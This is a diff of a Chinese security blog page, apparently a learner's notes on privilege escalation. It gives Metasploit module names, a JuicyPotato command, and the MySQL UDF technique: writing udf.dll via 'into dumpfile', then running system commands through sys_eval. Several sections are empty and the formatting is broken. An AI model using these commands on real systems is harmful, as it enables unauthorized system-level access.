@@ -9,7 +9,7 @@
     
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
   <title>
-    2021总结 |  
+    提权 |  
   </title>
   <meta name="generator" content="hexo-theme-ayer">
   
@@ -47,7 +47,7 @@
     <main class="content on">
       <section class="outer">
   <article
-  id="post-2021总结"
+  id="post-提权"
   class="article article-type-post"
   itemscope
   itemprop="blogPost"
@@ -58,18 +58,18 @@
     <header class="article-header">
        
 <h1 class="article-title sea-center" style="border-left:0" itemprop="name">
-  2021总结
+  提权
 </h1>
  
 
     </header>
      
     <div class="article-meta">
-      <a href="/2022/01/11/2021%E6%80%BB%E7%BB%93/" class="article-date">
-  <time datetime="2022-01-11T11:49:16.000Z" itemprop="datePublished">2022-01-11</time>
+      <a href="/2022/01/16/%E6%8F%90%E6%9D%83/" class="article-date">
+  <time datetime="2022-01-16T13:30:50.000Z" itemprop="datePublished">2022-01-16</time>
 </a> 
   <div class="article-category">
-    <a class="article-category-link" href="/categories/%E7%BB%8F%E5%8E%86/">经历</a>
+    <a class="article-category-link" href="/categories/%E6%8F%90%E6%9D%83/">提权</a>
   </div>
   
 <div class="word_count">
@@ -77,7 +77,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> Word count:</span>
-            <span class="post-count">106</span>
+            <span class="post-count">1.1k</span>
         </span>
     </span>
 
@@ -86,7 +86,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> Reading time≈</span>
-            <span class="post-count">1 min</span>
+            <span class="post-count">4 min</span>
         </span>
     </span>
 </div>
@@ -101,33 +101,106 @@
   
     <div class="article-entry" itemprop="articleBody">
        
-  <h2 id="2021"><a href="#2021" class="headerlink" title="2021"></a>2021</h2><ul>
-<li><input checked disabled type="checkbox"> 她依然在</li>
-<li><input checked disabled type="checkbox"> 暑假实习</li>
-<li><input checked disabled type="checkbox"> 体验线下awd</li>
-</ul>
+  <p>[toc]</p>
 <span id="more"></span>
 
+<h1 id="windows-提权"><a href="#windows-提权" class="headerlink" title="windows 提权"></a>windows 提权</h1><hr>
+<h3 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h3><p>汇总：<a target="_blank" rel="noopener" href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a></p>
+<h5 id="提权辅助"><a href="#提权辅助" class="headerlink" title="提权辅助"></a>提权辅助</h5><p>systeminfo   查看补丁</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/01/16/%E6%8F%90%E6%9D%83/image-20220221104049104.png" alt="image-20220221104049104"></p>
+<p><a target="_blank" rel="noopener" href="https://i.hacking8.com/tiquan">https://i.hacking8.com/tiquan</a> 寻找提权漏洞，github下载，但提权exe需要经过免杀测试 </p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Ascotbe/Kernelhub">Windows提权漏洞合集</a></p>
+<h5 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h5><ol>
+<li>该模块能够查询安装补丁</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use post&#x2F;windows&#x2F;gather&#x2F;enum_patches</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/01/16/%E6%8F%90%E6%9D%83/image-20220221103405151.png" alt="image-20220221103405151"></p>
+<ol start="2">
+<li>低权限用户的session，该模块用于快速识别系统中可能被利用的漏洞，进行提权</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use post&#x2F;multi&#x2F;recon&#x2F;local_exploit_suggester </span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/01/16/%E6%8F%90%E6%9D%83/image-20220221112230097.png" alt="image-20220221112230097"></p>
+<p>根据显示可利用的模块，进行提权（感觉可以）</p>
+<p><img src="/2022/01/16/%E6%8F%90%E6%9D%83/image-20220221131823569.png" alt="image-20220221131823569"></p>
+<h3 id="bypassUAC"><a href="#bypassUAC" class="headerlink" title="bypassUAC"></a>bypassUAC</h3><p>用户帐户控制 (UAC)  允许所有用户使用标准用户帐户登录到他们的计算机。 使用标准用户令牌启动的进程可能会使用授予标准用户的访问权限执行任务。借助 UAC，应用和任务将始终在非管理员帐户的安全上下文中运行，除非管理员专门授予管理员级别的访问系统权限。 UAC 可阻止自动安装未经授权的应用并防止意外更改系统设置。</p>
+<p>总之来说就是绕过uac限制，运行某些程序，对c盘一些重要文件进行读取和写入，安装卸载程序等</p>
+<p>适用于：</p>
 <ul>
-<li><input checked disabled type="checkbox"> 不挂科</li>
-<li><input checked disabled type="checkbox"> 加入安全团队，其他师傅好强</li>
-<li><input checked disabled type="checkbox"> 对内网有了深入认识和利用方式</li>
+<li>Windows 10，Windows 11，Windows Server 2016 和更高版本</li>
 </ul>
-<ul>
-<li><input disabled type="checkbox"> 实战能力太差</li>
-<li><input disabled type="checkbox"> 没有挖洞进展</li>
-<li><input disabled type="checkbox"> 寒假实习</li>
-</ul>
-<h2 id="2022"><a href="#2022" class="headerlink" title="2022"></a>2022</h2><ul>
-<li><p><input disabled type="checkbox">  运动，锻炼，看书，规律作息</p>
-</li>
-<li><p><input disabled type="checkbox">  寒假把内网在深入透彻</p>
-</li>
-<li><p><input disabled type="checkbox">  挖src，CNVD，java代码审计</p>
-</li>
-<li><p><input disabled type="checkbox">  去古檀，，，，一定一定要通过面试，短期梦想，加油</p>
-</li>
-</ul>
+<h5 id="msf-1"><a href="#msf-1" class="headerlink" title="msf:"></a>msf:</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/01/16/%E6%8F%90%E6%9D%83/image-20220221133213351.png" alt="image-20220221133213351"></p>
+<p>参考：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/vowFqYxX_x0gu2-38TEGFA">https://mp.weixin.qq.com/s/vowFqYxX_x0gu2-38TEGFA</a></p>
+<h5 id="dll注入"><a href="#dll注入" class="headerlink" title="dll注入"></a>dll注入</h5><h5 id="白名单进程"><a href="#白名单进程" class="headerlink" title="白名单进程"></a>白名单进程</h5><h3 id="土豆家族"><a href="#土豆家族" class="headerlink" title="土豆家族"></a>土豆家族</h3><p>Juicy Potato：<a target="_blank" rel="noopener" href="https://github.com/ohpe/juicy-potato">https://github.com/ohpe/juicy-potato</a></p>
+<p>原理：</p>
+<p>实际上就是利用MS16-075漏洞进行提权</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JuicyPotato.exe -t t -p c:\windows\system32\cmd.exe -l 1111 -c &#123;8BC3F05E-D86B-11D0-A075-00C04FB68820&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/01/16/%E6%8F%90%E6%9D%83/image-20220219151053814.png" alt="image-20220219151053814"></p>
+<p>条件：</p>
+<ol>
+<li>用户权限：</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">如果开启SeImpersonate权限，juicypotato的参数可以使用-t t</span><br><span class="line"></span><br><span class="line">如果开启SeAssignPrimaryToken权限，juicypotato的参数可以使用-t u</span><br><span class="line"></span><br><span class="line">如果均开启，可以选择-t *</span><br><span class="line">如果均未开启，那么无法提权</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>RPC 135端口是否开启</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&#96;&#96;&#96;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;66y_Pg2j9CNfxeErFczdSg</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;lmfM6VWM3YXj2vjalNerKw</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;blog.cfyqy.com&#x2F;article&#x2F;bde10ad7.html#more</span><br><span class="line"></span><br><span class="line"># linux 提权</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### suid</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### sudo</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># mysql提权</span><br><span class="line"></span><br><span class="line">### udf </span><br><span class="line"></span><br><span class="line">原理：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>UDF是mysql的一个扩展接口，即扩展mysql的用户自定义函数。用户可以向mysql的udf.dll中添加用户自定义函数（可以执行命令的函数，如sys_eval（）），即可获得system权限。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">条件：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<ol>
+<li>mysql用户(root)的密码，（查询，破解hash）</li>
+<li>secure_file_priv的值为空，具有写入权限，<br>如果mysql服务器开启了secure-file-priv选项，就只能将文件导出到指定目录下</li>
+</ol>
+<p>dll位置：<br>mysql版本&gt;=5.1 dll文件导入lib\plugin目录<br>5.0&lt;mysql版本&lt;5.1 dll文件导入c:\windows或者c:\windows\system32目录下</p>
+<p>mysql版本&lt;4.1  任意位置<br>4.1&lt;=mysql版本&lt;5.0</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">查看mysql的版本</span><br><span class="line"></span><br><span class="line">![](提权&#x2F;57.png)</span><br><span class="line"></span><br><span class="line">查看&#96;secure_file_priv&#96;的值</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>show global variables like ‘secure%’;</p>
+<p>当 secure_file_priv 的值为 null ，表示限制 mysqld 不允许导入|导出，此时无法提权</p>
+<p>当 secure_file_priv 的值为 /tmp/ ，表示限制 mysqld 的导入|导出只能发生在 /tmp/ 目录下，此时也无法提权</p>
+<p>当 secure_file_priv 的值没有具体值时，表示不对 mysqld 的导入|导出做限制，此时可提权</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![](提权&#x2F;58.png)</span><br><span class="line"></span><br><span class="line">此处&#96;secure_file_priv&#96;的值为空，符合提权的要求</span><br><span class="line"></span><br><span class="line">查看&#96;plugin&#96;的目录名称</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>show variables like ‘plugin%’;</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![](提权&#x2F;59.png)</span><br><span class="line"></span><br><span class="line">查询目录的绝对路径</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>select @@plugin_dir;</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![](提权&#x2F;60.png)</span><br><span class="line"></span><br><span class="line">查看系统架构</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>show variables like ‘%compile%’;</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![](提权&#x2F;61.png)</span><br><span class="line"></span><br><span class="line">可以看到该主机是64位的</span><br><span class="line"></span><br><span class="line">接下来将udf.dll文件写入plugin目录，并创建函数</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>select 0x十六进制内容 into dumpfile “plugin的目录\udf.dll”</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">把桌面上的tools文件夹中的udf.txt里面的十六进制内容写入&#96;C:\Program Files\MySQL\MySQL Server 5.5\lib\plugin\udf.dll&#96;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>select 0x4D5A90000300000 …… into dumpfile ‘C:\Program Files\MySQL\MySQL Server 5.5\lib\plugin\udf.dll’;</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![](提权&#x2F;62.png)</span><br><span class="line"></span><br><span class="line">![](提权&#x2F;63.png)</span><br><span class="line"></span><br><span class="line">成功将udf.dll写入目标路径</span><br><span class="line"></span><br><span class="line">导入udf函数</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>create function sys_eval returns string soname ‘udf.dll’;    # 导入sys_eval函数</p>
+<p>select * from mysql.func where name = ‘sys_eval’;   # 查看创建的sys_eval函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![](提权&#x2F;64.png)</span><br><span class="line"></span><br><span class="line">执行系统命令</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>select sys_eval(‘whoami’);</p>
+<p>select sys_eval(‘ipconfig’);</p>
+<pre><code>
+![](提权/65.png)
+
+成功获取system权限
+
+
+### mof
+
+
+
+
+
+
+
+
+
+# mssql提权
+
+### xp_cmdshell
+</code></pre>
  
       <!-- reward -->
       
@@ -180,12 +253,12 @@
     <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2022/01/11/2021%E6%80%BB%E7%BB%93/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2022/01/16/%E6%8F%90%E6%9D%83/" alt="微信分享二维码">
     </div>
 </div>
 
 <div id="share-mask"></div>  
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AF%B92021%E5%B9%B4%E6%80%BB%E7%BB%93/" rel="tag">对2021年总结</a></li></ul>
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%8F%90%E6%9D%83/" rel="tag">提权</a></li></ul>
 
     </footer>
   </div>
@@ -193,19 +266,19 @@
    
   <nav class="article-nav">
     
-      <a href="/2022/01/16/%E6%8F%90%E6%9D%83/" class="article-nav-link">
+      <a href="/2022/01/23/%E5%86%85%E7%BD%91%E7%9F%A5%E8%AF%86%E5%AD%A6%E4%B9%A0/" class="article-nav-link">
         <strong class="article-nav-caption">上一篇</strong>
         <div class="article-nav-title">
           
-            提权
+            内网知识学习
           
         </div>
       </a>
     
     
-      <a href="/2022/01/03/%E7%AE%80%E5%8D%95%E7%9A%84%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/" class="article-nav-link">
+      <a href="/2022/01/11/2021%E6%80%BB%E7%BB%93/" class="article-nav-link">
         <strong class="article-nav-caption">下一篇</strong>
-        <div class="article-nav-title">简单的靶场渗透</div>
+        <div class="article-nav-title">2021总结</div>
       </a>
     
   </nav>
